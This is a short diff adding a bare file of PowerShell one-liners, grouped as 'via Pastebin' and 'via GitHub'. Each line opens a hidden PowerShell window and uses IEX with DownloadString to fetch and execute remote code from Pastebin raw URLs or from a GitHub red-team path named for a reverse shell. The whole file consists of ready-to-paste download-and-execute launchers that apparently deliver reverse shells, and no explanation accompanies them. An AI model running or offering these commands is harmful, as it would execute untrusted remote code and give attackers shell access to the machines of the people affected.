@@ -1,0 +1,10 @@
+VIA PASTEBIN:
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/QsDtQeCE');"
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/fVvJxccq');"
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/dFThi3g1');"
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/LUqqBhTr');"
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/e6PfAbRr');"
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/3AZZA38V');"
+
+VIA GITHUB:
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Reverse_Shell/one_line_PS_Rev_Shell_1.txt');"
